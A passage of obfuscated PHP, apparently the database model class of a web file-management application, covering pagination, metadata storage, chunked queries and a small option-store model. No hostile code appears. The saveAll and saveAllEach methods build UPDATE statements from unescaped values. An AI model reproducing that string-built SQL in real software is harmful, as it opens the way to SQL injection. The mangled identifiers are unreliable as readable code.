$in[$¦¼ª€™„[392]] : $í—ü¯±; if ($í—ü¯± === -1) { $in[$¦¼ª€™„[392]] = !1; $Á¡îœİÉ = 100000000; $í—ü¯± = $Á¡îœİÉ; } $ƒ¶‹Ì¬‘ = $ÆËŞ¸Û; $ƒ¶‹Ì¬‘[$¦¼ª€™„[394]] = array(); $í—ü¯± = intval($í—ü¯±); $í—ü¯± = $í—ü¯± <= 5 ? 5 : ($í—ü¯± >= $Á¡îœİÉ ? $Á¡îœİÉ : $í—ü¯±); $ŸáúòÀõ = intval(isset($in[$¦¼ª€™„[382]]) && $in[$¦¼ª€™„[382]] ? $in[$¦¼ª€™„[382]] : $ŸáúòÀõ); $ŸáúòÀõ = $ŸáúòÀõ <= 1 ? 1 : $ŸáúòÀõ; $ëº°Ô¹è = array(); $Á²ı¤Òó = 1; if ($ŸáúòÀõ == 1 && $Á²ı¤Òó) { $this->optionsValue($ÆËŞ¸Û); $ëº°Ô¹è = $this->page($ŸáúòÀõ, $í—ü¯±)->select(); $Ÿ¾»ş  = is_array($ëº°Ô¹è) ? count($ëº°Ô¹è) : 0; if ($Ÿ¾»ş  < $í—ü¯±) { $ñ¶ÜÜæ™ = 1; } else { $this->optionsValue($ƒ¶‹Ì¬‘); $Ÿ¾»ş  = intval($this->count()); $ñ¶ÜÜæ™ = ceil($Ÿ¾»ş  / $í—ü¯±); } } else { $this->optionsValue($ƒ¶‹Ì¬‘); $Ÿ¾»ş  = intval($this->count()); $ñ¶ÜÜæ™ = ceil($Ÿ¾»ş  / $í—ü¯±); $ŸáúòÀõ = $ŸáúòÀõ >= $ñ¶ÜÜæ™ ? $ñ¶ÜÜæ™ : $ŸáúòÀõ; $this->optionsValue($ÆËŞ¸Û); $ëº°Ô¹è = $this->page($ŸáúòÀõ, $í—ü¯±)->select(); } if (!is_array($ëº°Ô¹è)) { $ëº°Ô¹è = array(); } if ($ñ¶ÜÜæ™ == 1) { $Ÿ¾»ş  = count($ëº°Ô¹è); } $êĞ’“İ© = array($¦¼ª€™„[395] => array($¦¼ª€™„[396] => $Ÿ¾»ş , $¦¼ª€™„[392] => $í—ü¯±, $¦¼ª€™„[382] => $ŸáúòÀõ, $¦¼ª€™„[397] => $ñ¶ÜÜæ™), $¦¼ª€™„[398] => $ëº°Ô¹è); return $êĞ’“İ©; } protected function checkLength($…ñÂÔª, $—ºÍ£Ã = 0, $İñÆ¬¯õ = '') { $Çàşà¨Ç =& $_SERVER[¹ş¤¶ĞÖ]; $—ºÍ£Ã = $—ºÍ£Ã ? $—ºÍ£Ã : 65536; if (!$…ñÂÔª || strlen($…ñÂÔª) < $—ºÍ£Ã) { return; } $İñÆ¬¯õ = $İñÆ¬¯õ ? $İñÆ¬¯õ . $Çàşà¨Ç[71] : $Çàşà¨Ç[12]; show_json($İñÆ¬¯õ . LNG($Çàşà¨Ç[399]) . "\50{$—ºÍ£Ã}\51", !1); } protected function metaSet($ïÁ•Ó §, $ŞÌ÷À†ğ = null, $ê—µõ† = null) { $–Š‹¥ã¶ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->tableMeta || !$ïÁ•Ó §) { return !1; } $úîÓ­ÃÔ = $this->tableMeta[$–Š‹¥ã¶[400]]; $ô¸·–‹° = $this->tableMeta[$–Š‹¥ã¶[401]]; $š“·òéÖ = Model($ô¸·–‹°); $¢¨ÎŸí´ = array($úîÓ­ÃÔ => $ïÁ•Ó §, $–Š‹¥ã¶[402] => $ŞÌ÷À†ğ); if (is_null($ŞÌ÷À†ğ)) { return $š“·òéÖ->where(array($úîÓ­ÃÔ => $ïÁ•Ó §))->delete(); } if (is_null($ê—µõ†) && is_string($ŞÌ÷À†ğ)) { return $š“·òéÖ->where($¢¨ÎŸí´)->delete(); } $Ÿá‹ãˆ¬ = is_array($ŞÌ÷À†ğ) ? $ŞÌ÷À†ğ : array(); if (is_string($ŞÌ÷À†ğ)) { $Ÿá‹ãˆ¬[$ŞÌ÷À†ğ] = $ê—µõ†; } $ïç´îÇ‹ = array(); foreach ($Ÿá‹ãˆ¬ as $¥×‚¯“Û => $€æ›ÁØ) { if (is_null($€æ›ÁØ) && is_string($¥×‚¯“Û)) { $š“·òéÖ->where(array($úîÓ­ÃÔ => $ïÁ•Ó §, $–Š‹¥ã¶[402] => $¥×‚¯“Û))->delete(); continue; } $this->checkLength($€æ›ÁØ, !1, $ô¸·–‹° . $–Š‹¥ã¶[4] . $¥×‚¯“Û); $ïç´îÇ‹[] = array($úîÓ­ÃÔ => $ïÁ•Ó §, $–Š‹¥ã¶[94] => $¥×‚¯“Û, $–Š‹¥ã¶[403] => $€æ›ÁØ); } $øÛç‰Š´ = $–Š‹¥ã¶[404] . $ô¸·–‹°; CacheLock::lock($øÛç‰Š´); $š“·òéÖ->where(array($úîÓ­ÃÔ => $ïÁ•Ó §))->addAll($ïç´îÇ‹, array(), !0); CacheLock::unlock($øÛç‰Š´); return !0; } public function metaGet($’ÂŒ—¼Ò, $íÜ·Ü€£ = false) { $Å±ƒšß… =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->tableMeta) { return array(); } $ç‹­Æ˜Ø = $this->tableMeta[$Å±ƒšß…[400]]; $ù¿½›Æğ = Model($this->tableMeta[$Å±ƒšß…[401]]); if ($íÜ·Ü€£) { $ŠØÎ¾‰Û = array($ç‹­Æ˜Ø => $’ÂŒ—¼Ò, $Å±ƒšß…[94] => $íÜ·Ü€£); return $ù¿½›Æğ->where($ŠØÎ¾‰Û)->getField($Å±ƒšß…[403]); } $ŠØÎ¾‰Û = array($ç‹­Æ˜Ø => $’ÂŒ—¼Ò); $ÏñáºÏ… = $ù¿½›Æğ->field($Å±ƒšß…[405])->where($ŠØÎ¾‰Û)->select(); $ÏñáºÏ… = array_to_keyvalue($ÏñáºÏ…, $Å±ƒšß…[94], $Å±ƒšß…[403]); return $ÏñáºÏ…; } private function checkDataAutoHas($åÂˆİØÀ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ğ´˜³Ûƒ) { if (in_array($åÂˆİØÀ, explode($_SERVER[¹ş¤¶ĞÖ][50], $Ğ´˜³Ûƒ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ã×Ù¨ˆ, $İ· ÷´«) { $˜à¤¿¨ =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_array($ã×Ù¨ˆ)) { return; } foreach ($this->dataAuto as $ÕÔÃ¯¶Ò) { $ôğ¨ª‰Œ = $ÕÔÃ¯¶Ò[0]; if (!in_array($İ· ÷´«, explode($˜à¤¿¨[50], $ÕÔÃ¯¶Ò[2]))) { continue; } switch (trim($ÕÔÃ¯¶Ò[3])) { case $˜à¤¿¨[350]: case $˜à¤¿¨[351]: $«½ÄÇ˜ = $ÕÔÃ¯¶Ò[1]; $¬êï‹° = isset($ÕÔÃ¯¶Ò[4]) ? (array) $ÕÔÃ¯¶Ò[4] : array(); if ($«½ÄÇ˜ == $˜à¤¿¨[180] && array_key_exists($ôğ¨ª‰Œ, $ã×Ù¨ˆ)) { if (!$ã×Ù¨ˆ[$ôğ¨ª‰Œ]) { unset($ã×Ù¨ˆ[$ôğ¨ª‰Œ]); } break; } if (isset($ã×Ù¨ˆ[$ôğ¨ª‰Œ])) { array_unshift($¬êï‹°, $ã×Ù¨ˆ[$ôğ¨ª‰Œ]); } if ($˜à¤¿¨[350] == $ÕÔÃ¯¶Ò[3]) { $ã×Ù¨ˆ[$ôğ¨ª‰Œ] = call_user_func_array($«½ÄÇ˜, $¬êï‹°); } else { $ã×Ù¨ˆ[$ôğ¨ª‰Œ] = call_user_func_array(array(&$this, $«½ÄÇ˜), $¬êï‹°); } break; case $˜à¤¿¨[299]: if (isset($ã×Ù¨ˆ[$ôğ¨ª‰Œ]) && $ã×Ù¨ˆ[$ôğ¨ª‰Œ]) { $ã×Ù¨ˆ[$ôğ¨ª‰Œ] = call_user_func_array(array(&$this, $ÕÔÃ¯¶Ò[1]), array($ã×Ù¨ˆ[$ôğ¨ª‰Œ])); } break; case $˜à¤¿¨[302]: $ã×Ù¨ˆ[$ôğ¨ª‰Œ] = $ã×Ù¨ˆ[$ÕÔÃ¯¶Ò[1]]; break; case $˜à¤¿¨[323]: if (isset($ã×Ù¨ˆ[$ôğ¨ª‰Œ]) && !is_string($ã×Ù¨ˆ[$ôğ¨ª‰Œ])) { $ã×Ù¨ˆ[$ôğ¨ª‰Œ] = json_encode_force($ã×Ù¨ˆ[$ôğ¨ª‰Œ]); } break; case $˜à¤¿¨[352]: if ($ã×Ù¨ˆ[$ôğ¨ª‰Œ] === $˜à¤¿¨[12]) { unset($ã×Ù¨ˆ[$ôğ¨ª‰Œ]); } break; case $˜à¤¿¨[353]: $ã×Ù¨ˆ[$ôğ¨ª‰Œ] = $ÕÔÃ¯¶Ò[1]; default: break; } } if ($İ· ÷´« == $˜à¤¿¨[384]) { $çˆá÷‡ = strtolower($this->db->getDbType()); if (strpos($çˆá÷‡, $˜à¤¿¨[13]) !== 0) { return; } $¬˜Âõã = $this->field(!0)->fields; $³ı½ø°‡ = $¬˜Âõã[$˜à¤¿¨[281]]; if (isset($¬˜Âõã[$˜à¤¿¨[280]])) { unset($³ı½ø°‡[$¬˜Âõã[$˜à¤¿¨[280]]]); } foreach ($³ı½ø°‡ as $Î¨½Õ‡ => $İ· ÷´«) { if (!isset($ã×Ù¨ˆ[$Î¨½Õ‡])) { $ã×Ù¨ˆ[$Î¨½Õ‡] = $˜à¤¿¨[12]; } } } } private function dataAfterFilter(&$÷‡²ª¢) { $Ú¾òĞÏ› =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($this->dataAuto as $ÈÕ®üë²) { $æ¶££‹œ = $ÈÕ®üë²[0]; if (!isset($÷‡²ª¢[$æ¶££‹œ])) { continue; } if (!in_array($Ú¾òĞÏ›[386], explode($Ú¾òĞÏ›[50], $ÈÕ®üë²[2]))) { continue; } switch (trim($ÈÕ®üë²[3])) { case $Ú¾òĞÏ›[350]: case $Ú¾òĞÏ›[351]: $ÔÈé÷ëğ = isset($ÈÕ®üë²[4]) ? (array) $ÈÕ®üë²[4] : array(); array_unshift($ÔÈé÷ëğ, $÷‡²ª¢[$æ¶££‹œ]); if (isset($ÈÕ®üë²[4]) && $ÈÕ®üë²[4] == $Ú¾òĞÏ›[406]) { $ÔÈé÷ëğ = array($÷‡²ª¢[$æ¶££‹œ]); } if ($Ú¾òĞÏ›[350] == $ÈÕ®üë²[3]) { $÷‡²ª¢[$æ¶££‹œ] = call_user_func_array($ÈÕ®üë²[1], $ÔÈé÷ëğ); } else { $÷‡²ª¢[$æ¶££‹œ] = call_user_func_array(array(&$this, $ÈÕ®üë²[1]), $ÔÈé÷ëğ); } break; case $Ú¾òĞÏ›[299]: if (isset($÷‡²ª¢[$æ¶££‹œ]) && $÷‡²ª¢[$æ¶££‹œ]) { $÷‡²ª¢[$æ¶££‹œ] = call_user_func_array(array(&$this, $ÈÕ®üë²[1]), array($÷‡²ª¢[$æ¶££‹œ])); } break; case $Ú¾òĞÏ›[302]: $÷‡²ª¢[$æ¶££‹œ] = $÷‡²ª¢[$ÈÕ®üë²[1]]; break; case $Ú¾òĞÏ›[323]: $Åñ¾ªß = $÷‡²ª¢[$æ¶££‹œ]; $÷‡²ª¢[$æ¶££‹œ] = json_decode($Åñ¾ªß, !0); if (is_null($÷‡²ª¢[$æ¶££‹œ])) { $÷‡²ª¢[$æ¶££‹œ] = $Åñ¾ªß; } break; case $Ú¾òĞÏ›[352]: if ($÷‡²ª¢[$æ¶££‹œ] === $Ú¾òĞÏ›[12]) { unset($÷‡²ª¢[$æ¶££‹œ]); } break; case $Ú¾òĞÏ›[353]: $÷‡²ª¢[$æ¶££‹œ] = $ÈÕ®üë²[1]; break; default: break; } } } public function saveAll($’ÎÃŸ¯£) { $İìàº‚Ü =& $_SERVER[¹ş¤¶ĞÖ]; $ªµ­ÖÎ = $this->tablePrefix . $this->tableName; $—¼¹Ôïå = self::SQL_WHERE_IN_CHUNK; $’ÎÃŸ¯£ = is_array($’ÎÃŸ¯£) ? $’ÎÃŸ¯£ : array(); $¬µÇ¾ = $İìàº‚Ü[407]; $¶î›»¢ƒ = 0; $„Íß¦¯² = array(); $–¢ôÑ§ = count($’ÎÃŸ¯£); for ($‚©ø›Š† = 0; $‚©ø›Š† < $–¢ôÑ§; $‚©ø›Š†++) { $‰”‡ŠÅ = $’ÎÃŸ¯£[$‚©ø›Š†]; if (!is_array($‰”‡ŠÅ) || count($‰”‡ŠÅ) != 4) { continue; } $‚÷Èñ¹ = "\x55\120\104\x41\124\105\40\x60{$ªµ­ÖÎ}\140\x20\x53\105\x54\40{$‰”‡ŠÅ[2]}\x20\x3d\x20\x43\101\x53\105\x20{$‰”‡ŠÅ[0]}\40\xa"; if ($¶î›»¢ƒ == 0) { $¬µÇ¾ = $‚÷Èñ¹; } $„Íß¦¯²[] = $İìàº‚Ü[118] . $‰”‡ŠÅ[1] . $İìàº‚Ü[118]; $¶î›»¢ƒ++; $¬µÇ¾ .= "\x20\127\110\x45\x4e\x20\47{$‰”‡ŠÅ[1]}\x27\x20\124\x48\105\x4e\40\47{$‰”‡ŠÅ[3]}\x27\x20\xa"; if ($¶î›»¢ƒ == $—¼¹Ôïå || $‚©ø›Š† == $–¢ôÑ§ - 1) { $øÆÜÏÑÇ = implode($İìàº‚Ü[50], $„Íß¦¯²); $¬µÇ¾ .= "\40\105\116\104\40\x20\127\x48\x45\x52\105\x20{$‰”‡ŠÅ[0]}\40\111\x4e\x20\50{$øÆÜÏÑÇ}\51\40"; $this->execute($¬µÇ¾); $¶î›»¢ƒ = 0; $¬µÇ¾ = $‚÷Èñ¹; $this->chunkEventCheck(count($„Íß¦¯²)); $„Íß¦¯² = array(); } } $this->chunkEventSet(); } public function saveAllEach($†”„ª¯´) { $äÁÎôÏ =& $_SERVER[¹ş¤¶ĞÖ]; $Ì¨ìú = $this->tablePrefix . $this->tableName; foreach ($†”„ª¯´ as $¾·‡£Ê) { if (!is_array($¾·‡£Ê) || count($¾·‡£Ê) != 4) { continue; } $ÉüöËñ = $¾·‡£Ê[0] . $äÁÎôÏ[408] . $¾·‡£Ê[1] . $äÁÎôÏ[118]; $ÄÊµĞ = $¾·‡£Ê[2] . $äÁÎôÏ[408] . $¾·‡£Ê[3] . $äÁÎôÏ[118]; $óæ¤®åÎ = "\x75\160\x64\x61\164\145\40{$Ì¨ìú}\x20\x73\x65\x74\x20{$ÄÊµĞ}\x20\167\150\145\162\x65\40{$ÉüöËñ}\73"; $this->execute($óæ¤®åÎ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($·«©ì«« = false, $îµÁß¶¶ = false) { $this->_chunkEvent = $·«©ì««; $this->_chunkEventParam = $îµÁß¶¶; } private function chunkEventCheck($ı­ëÓ¾ß) { if (!$this->_chunkEvent) { return; } $£¾ æ¾÷ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $£¾ æ¾÷[$_SERVER[¹ş¤¶ĞÖ][409]] = $ı­ëÓ¾ß; Hook::trigger($this->_chunkEvent, $£¾ æ¾÷); } public function addAll($œ’–¶Ôç, $‹¿Çâó = array(), $Å¦Ä¾È— = false) { $ø’ËŠï„ =& $_SERVER[¹ş¤¶ĞÖ]; ignore_timeout(); $Ç†ÅíÀ« = self::SQL_WHERE_IN_CHUNK; if (empty($œ’–¶Ôç)) { $this->error = think_lang($ø’ËŠï„[300]); return !1; } $‹¿Çâó = $this->_parseOptions($‹¿Çâó); foreach ($œ’–¶Ôç as $’¿’ÊŸÉ => $Šî…øÒµ) { $œ’–¶Ôç[$’¿’ÊŸÉ] = $this->_facade($Šî…øÒµ); $this->_beforeInsert($œ’–¶Ôç[$’¿’ÊŸÉ], $‹¿Çâó); } if (method_exists($this->db, $ø’ËŠï„[301])) { for ($ÜğØååÒ = 0; $ÜğØååÒ < count($œ’–¶Ôç); $ÜğØååÒ += $Ç†ÅíÀ«) { $‚…üˆëî = array_slice($œ’–¶Ôç, $ÜğØååÒ, $Ç†ÅíÀ«); if (!is_array($‚…üˆëî) || count($‚…üˆëî) == 0) { break; } $î¹·é± = $this->db->insertAll($‚…üˆëî, $‹¿Çâó, $Å¦Ä¾È—); $this->chunkEventCheck(count($‚…üˆëî)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($œ’–¶Ôç as $’¿’ÊŸÉ => $Šî…øÒµ) { $î¹·é± = $this->db->insert($Šî…øÒµ, $‹¿Çâó, $Å¦Ä¾È—); } $this->commit(); } if (!1 !== $î¹·é±) { $üÚÎ¥à = $this->getLastInsID(); if ($üÚÎ¥à) { return $üÚÎ¥à; } } return $î¹·é±; } public function save($î§ı‡¯• = '', $ÚªìÉøê = array()) { $ÀŒ™şÑ° =& $_SERVER[¹ş¤¶ĞÖ]; $‡”…Õß‰ = self::SQL_WHERE_IN_CHUNK; $ğ·¾ù»Ä = $this->optionsValue(); $œ¥®°Çè = $this->findWhereField($ğ·¾ù»Ä); if (!$œ¥®°Çè) { return parent::save($î§ı‡¯•, $ÚªìÉøê); } $¼èçßÑÈ = 0; $Ú–‡®˜ó = $ğ·¾ù»Ä[$ÀŒ™şÑ°[304]][$œ¥®°Çè][1]; $Ú–‡®˜ó = is_array($Ú–‡®˜ó) ? $Ú–‡®˜ó : array(); $·íÓ¬ë = count($Ú–‡®˜ó); for ($ƒ‚×‹ˆß = 0; $ƒ‚×‹ˆß < $·íÓ¬ë; $ƒ‚×‹ˆß += $‡”…Õß‰) { $÷‰Üêı = array_slice($Ú–‡®˜ó, $ƒ‚×‹ˆß, $‡”…Õß‰); if (!is_array($÷‰Üêı) || count($÷‰Üêı) == 0) { break; } $ğ·¾ù»Ä[$ÀŒ™şÑ°[304]][$œ¥®°Çè][1] = $÷‰Üêı; $this->optionsValue($ğ·¾ù»Ä); $¼èçßÑÈ += parent::save($î§ı‡¯•, $ÚªìÉøê); $this->chunkEventCheck(count($÷‰Üêı)); } $this->chunkEventSet(); return $¼èçßÑÈ; } public function add($³Ï¹º† = '', $˜»äÉ¿¡ = array(), $ÉÚ¨ÊÎ¸ = false) { if ($this->addTaskStatus && is_array($³Ï¹º†)) { $this->addTaskData[] = $³Ï¹º†; return; } return parent::add($³Ï¹º†, $˜»äÉ¿¡, $ÉÚ¨ÊÎ¸); } public function parseWhereLike($À¨ÄÇø, $Ú„Õ¬²ù = '', $…ª´Éº½ = false, &$ïîÖ¬µÂ = false) { $½“®¤ŸÇ =& $_SERVER[¹ş¤¶ĞÖ]; $şø˜¬÷ã = $GLOBALS[$½“®¤ŸÇ[6]][$½“®¤ŸÇ[410]]; if (!$şø˜¬÷ã[$½“®¤ŸÇ[411]]) { return $À¨ÄÇø; } if (!is_array($À¨ÄÇø)) { return $À¨ÄÇø; } $®‘»›Ú = array(); $ù™üÖÆ = 0; foreach ($À¨ÄÇø as $öÏ¦’­Å => $«õÇÔ»â) { if (is_array($«õÇÔ»â) && count($«õÇÔ»â) == 2 && $«õÇÔ»â[0] == $½“®¤ŸÇ[412] && is_string($«õÇÔ»â[1]) && substr($«õÇÔ»â[1], 0, 1) == $½“®¤ŸÇ[413] && substr($«õÇÔ»â[1], strlen($«õÇÔ»â[1]) - 1, 1) == $½“®¤ŸÇ[413]) { $ïîÖ¬µÂ = !0; $ÔÈ³è½ = is_string($öÏ¦’­Å) ? $öÏ¦’­Å : $Ú„Õ¬²ù; $Åí¼ø = substr($«õÇÔ»â[1], 1, strlen($«õÇÔ»â[1]) - 2); $Åí¼ø = $this->db->escapeString($Åí¼ø); if (!strpos($ÔÈ³è½, $½“®¤ŸÇ[10])) { $ÔÈ³è½ = $½“®¤ŸÇ[414] . $ÔÈ³è½ . $½“®¤ŸÇ[414]; } $¼õÈ¾¼ç = $½“®¤ŸÇ[189] . $Åí¼ø . $½“®¤ŸÇ[189]; $Åí¼ø = str_replace(array($½“®¤ŸÇ[10], $½“®¤ŸÇ[415], $½“®¤ŸÇ[11]), $½“®¤ŸÇ[416], $Åí¼ø); if ($şø˜¬÷ã[$½“®¤ŸÇ[417]]) { $¼õÈ¾¼ç = $½“®¤ŸÇ[418] . $Åí¼ø . $½“®¤ŸÇ[419]; if ($şø˜¬÷ã[$½“®¤ŸÇ[420]]) { $¼õÈ¾¼ç = $½“®¤ŸÇ[419] . $Åí¼ø . $½“®¤ŸÇ[418]; } } $®‘»›Ú[$ù™üÖÆ] = $½“®¤ŸÇ[421] . $ÔÈ³è½ . $½“®¤ŸÇ[422] . $¼õÈ¾¼ç . $½“®¤ŸÇ[423]; $ù™üÖÆ++; continue; } if (is_array($«õÇÔ»â)) { $Ú„Õ¬²ù = is_string($öÏ¦’­Å) ? $öÏ¦’­Å : $Ú„Õ¬²ù; $«õÇÔ»â = $this->parseWhereLike($«õÇÔ»â, $Ú„Õ¬²ù, !0, $ïîÖ¬µÂ); } if (is_numeric($öÏ¦’­Å)) { $®‘»›Ú[$ù™üÖÆ] = $«õÇÔ»â; $ù™üÖÆ++; } else { $®‘»›Ú[$öÏ¦’­Å] = $«õÇÔ»â; } } if ($ïîÖ¬µÂ && !$…ª´Éº½) { } return $®‘»›Ú; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Âí¬­Á— = array()) { $œ‚çÜ´º =& $_SERVER[¹ş¤¶ĞÖ]; $ŒÖ¤ó­ú = self::SQL_WHERE_IN_CHUNK; $½ÚëÅ€ = $this->optionsValue(); $óÁñ¢Ãü = $this->findWhereField($½ÚëÅ€); if (!$óÁñ¢Ãü || isset($½ÚëÅ€[$œ‚çÜ´º[321]]) || isset($½ÚëÅ€[$œ‚çÜ´º[382]])) { return parent::select($Âí¬­Á—); } $ûöÄÆ”„ = $½ÚëÅ€[$œ‚çÜ´º[304]][$óÁñ¢Ãü][1]; $ûöÄÆ”„ = is_array($ûöÄÆ”„) ? $ûöÄÆ”„ : array(); $Ü¶ñÚ‘» = null; for ($ºÜµ¨á = 0; $ºÜµ¨á < count($ûöÄÆ”„); $ºÜµ¨á += $ŒÖ¤ó­ú) { $œªÊË¸½ = array_slice($ûöÄÆ”„, $ºÜµ¨á, $ŒÖ¤ó­ú); if (!is_array($œªÊË¸½) || count($œªÊË¸½) == 0) { break; } $½ÚëÅ€[$œ‚çÜ´º[304]][$óÁñ¢Ãü][1] = $œªÊË¸½; $this->optionsValue($½ÚëÅ€); $‚ÊÍÆäÛ = parent::select($Âí¬­Á—); if (!$‚ÊÍÆäÛ) { continue; } $Ü¶ñÚ‘» = is_array($Ü¶ñÚ‘») ? $Ü¶ñÚ‘» : array(); $Ü¶ñÚ‘» = array_merge($Ü¶ñÚ‘», $‚ÊÍÆäÛ); } return $Ü¶ñÚ‘»; } public function delete($üÓ¿ƒ³â = array()) { $ÅíôÈ¤Ï =& $_SERVER[¹ş¤¶ĞÖ]; $µ÷›®Í§ = self::SQL_WHERE_IN_CHUNK; $¿ï“«ıµ = $this->optionsValue(); $úÛÎĞºã = $this->findWhereField($¿ï“«ıµ); if (!$úÛÎĞºã) { return parent::delete($üÓ¿ƒ³â); } $ş’æù¢Ê = 0; $’¸ºÚí = $¿ï“«ıµ[$ÅíôÈ¤Ï[304]][$úÛÎĞºã][1]; $’¸ºÚí = is_array($’¸ºÚí) ? $’¸ºÚí : array(); for ($ŞõÄ…àÉ = 0; $ŞõÄ…àÉ < count($’¸ºÚí); $ŞõÄ…àÉ += $µ÷›®Í§) { $ü¬¢­ˆÊ = array_slice($’¸ºÚí, $ŞõÄ…àÉ, $µ÷›®Í§); if (!is_array($ü¬¢­ˆÊ) || count($ü¬¢­ˆÊ) == 0) { break; } $¿ï“«ıµ[$ÅíôÈ¤Ï[304]][$úÛÎĞºã][1] = $ü¬¢­ˆÊ; $this->optionsValue($¿ï“«ıµ); $ş’æù¢Ê += parent::delete($üÓ¿ƒ³â); } return $ş’æù¢Ê; } private function findWhereField($‘şğÃ«É) { $¤äÎÕ‚ş =& $_SERVER[¹ş¤¶ĞÖ]; $šàŠ·Ì = self::SQL_WHERE_IN_CHUNK; if (!is_array($‘şğÃ«É) || !is_array($‘şğÃ«É[$¤äÎÕ‚ş[304]])) { return !1; } foreach ($‘şğÃ«É[$¤äÎÕ‚ş[304]] as $ùàÙ°€ => $¾ıÒÇ—ş) { if (is_array($¾ıÒÇ—ş) && isset($¾ıÒÇ—ş[0]) && is_string($¾ıÒÇ—ş[0]) && strtolower($¾ıÒÇ—ş[0]) == $¤äÎÕ‚ş[7] && is_array($¾ıÒÇ—ş[1]) && count($¾ıÒÇ—ş[1]) > $šàŠ·Ì) { ignore_timeout(); return $ùàÙ°€; } } return !1; } public function setMasterDB($¬™Í ¤Â = true) { think_config($_SERVER[¹ş¤¶ĞÖ][424], $¬™Í ¤Â); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\155\x4f\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($´´´€ü÷ = false, $Ã‘ËÁ¬¹ = "\x6d\157\x64\151\x66\171\124\x69\x6d\x65", $†ï«ê¸‰ = false) { $Ç §’Àş = Model($this->modelType)->get(!1, $this->optionType, !0); $í•¬ßŞİ = array_values($Ç §’Àş); if ($í•¬ßŞİ && $í•¬ßŞİ[0] && !is_array($í•¬ßŞİ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ç §’Àş = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ç §’Àş) { return $´´´€ü÷ ? null : array(); } if (!$´´´€ü÷) { $Ç §’Àş = array_filter(array_values($Ç §’Àş)); return array_sort_by($Ç §’Àş, $Ã‘ËÁ¬¹, $†ï«ê¸‰); } return $Ç §’Àş[$_SERVER[¹ş¤¶ĞÖ][425] . $´´´€ü÷]; } public function insert($È²şç®è) { $´“½€¶“ =& $_SERVER[¹ş¤¶ĞÖ]; $È²şç®è = array_field_key($È²şç®è, $this->field); $¢Ò›ÈˆÂ = Model($this->modelType)->get($´“½€¶“[426], $this->optionType . $´“½€¶“[427]); $¢Ò›ÈˆÂ = $¢Ò›ÈˆÂ ? $¢Ò›ÈˆÂ : 0; $È²şç®è[$´“½€¶“[428]] = ++$¢Ò›ÈˆÂ; $È²şç®è[$´“½€¶“[201]] = time(); $È²şç®è[$´“½€¶“[85]] = time(); Model($this->modelType)->set($´“½€¶“[426], $¢Ò›ÈˆÂ, $this->optionType . $´“½€¶“[427]); Model($this->modelType)->set($´“½€¶“[425] . $¢Ò›ÈˆÂ, $È²şç®è, $this->optionType); return $¢Ò›ÈˆÂ; } public function update($×·Ëİğ, $ÍĞå Á«) { $à”ÄÜ»® =& $_SERVER[¹ş¤¶ĞÖ]; $ÍĞå Á« = array_field_key($ÍĞå Á«, $this->field); $ÓöÉé¾› = $this->listData($×·Ëİğ); if (!$ÓöÉé¾› || !$×·Ëİğ) { return !1; } $ÍĞå Á« = array_merge($ÓöÉé¾›, $ÍĞå Á«); $ÍĞå Á«[$à”ÄÜ»®[85]] = time(); return Model($this->modelType)->set($à”ÄÜ»®[425] . $×·Ëİğ, $ÍĞå Á«, $this->optionType); } public function remove($‘šşó‡ß) { if (!$‘šşó‡ß) { return !1; } return Model($this->modelType)->remove($_SERVER[¹ş¤¶ĞÖ][425] . $‘šşó‡ß, $this->optionType); } public function clear() { $Ù§†Ÿ„ =& $_SERVER[¹ş¤¶ĞÖ]; Model($this->modelType)->remove($Ù§†Ÿ„[426], $this->optionType . $Ù§†Ÿ„[427]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ûï£¹çå, $‰Úà¨£³) { if (!$‰Úà¨£³) { return !1; } $´Öü˜’Ñ = $this->listData(); $´Öü˜’Ñ = array_to_keyvalue($´Öü˜’Ñ, $ûï£¹çå); return isset($´Öü˜’Ñ[$‰Úà¨£³]) ? $´Öü˜’Ñ[$‰Úà¨£³] : !1; } public function findByName($üıî½†ê) { return $this->findByKey($_SERVER[¹ş¤¶ĞÖ][32], $üıî½†ê); } protected function resetData($¶ÍÇ•¯ß) { $ƒŞÑÕåŒ =& $_SERVER[¹ş¤¶ĞÖ]; $¶ÍÇ•¯ß = is_array($¶ÍÇ•¯ß) ? $¶ÍÇ•¯ß : array(); $·¹Ë€Ã = array(); for ($ËœÑÕİ = 0; $ËœÑÕİ < count($¶ÍÇ•¯ß); $ËœÑÕİ++) { $·¹Ë€Ã[$ƒŞÑÕåŒ[425] . $¶ÍÇ•¯ß[$ËœÑÕİ][$ƒŞÑÕåŒ[428]]] = $¶ÍÇ•¯ß[$ËœÑÕİ]; } return Model($this->modelType)->set($·¹Ë€Ã, !1, $this->optionType); } private function getAutoName($Ç‹„Î) { $¿Ó´²ƒÛ = array_to_keyvalue($this->listData(), $_SERVER[¹ş¤¶ĞÖ][32]); if (!$¿Ó´²ƒÛ || !isset($¿Ó´²ƒÛ[$Ç‹„Î])) { return $Ç‹„Î; } for ($ƒë‹„×” = 1; $ƒë‹„×” < count($¿Ó´²ƒÛ); $ƒë‹„×”++) { $ı±¹÷Ûú = $Ç‹„Î . "\50{$ƒë‹„×”}\x29"; if (!isset($¿Ó´²ƒÛ[$ı±¹÷Ûú])) { return $ı±¹÷Ûú; } } return $ı±¹÷Ûú; } } goto AÊ‹íÊ¾ô´; E¼²ØŠŒåç: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÉÆ‹õä® =& $_SERVER[¹ş¤¶ĞÖ]; $„›Í¨È¹ = 